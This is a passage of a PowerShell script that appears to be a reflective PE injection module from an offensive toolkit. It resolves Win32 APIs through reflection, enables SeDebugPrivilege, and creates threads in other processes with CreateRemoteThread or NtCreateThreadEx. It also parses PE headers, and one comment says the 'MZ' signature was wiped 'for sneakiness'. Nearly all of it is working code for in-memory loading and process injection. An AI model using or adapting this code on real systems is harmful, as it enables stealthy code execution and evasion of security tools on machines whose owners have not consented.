        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0

        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object

        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc

        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx

        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy

        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset

        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary

        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress

        $GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal

        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree

        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx

        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect

        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle

        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary

        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess

        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject

        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory

        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory

        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread

        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread

        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken

        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread

        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges

        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue

        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf

        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }

        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process

        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread

        $LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $LocalFreeDelegate = Get-DelegateType @([IntPtr])
        $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree

        return $Win32Functions
    }
    #####################################


    #####################################
    ###########    HELPERS   ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }


                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($FinalBytes, 0)
    }


    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF

                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($FinalBytes, 0)
    }


    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }

        return $false
    }


    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )

        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )

        [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))

        $PEEndAddress = $PEInfo.EndAddress

        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }


    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,

            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )

        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]

            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),

            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')

        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]

            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,

            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }


    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }

        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }

                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }

        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }


    Function Invoke-CreateRemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,

        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )

        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero

        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }

        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Verbose "Error creating remote thread, thread handle is null"
        }

        return $RemoteThreadHandle
    }



    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        $NtHeadersInfo = New-Object System.Object

        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        #Get IMAGE_NT_HEADERS
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)

        #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }

        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }

        return $NtHeadersInfo
    }


    #This function will get the information needed to allocated space in memory for the PE
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        $PEInfo = New-Object System.Object

        #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null

        #Get NtHeadersInfo
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types

        #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
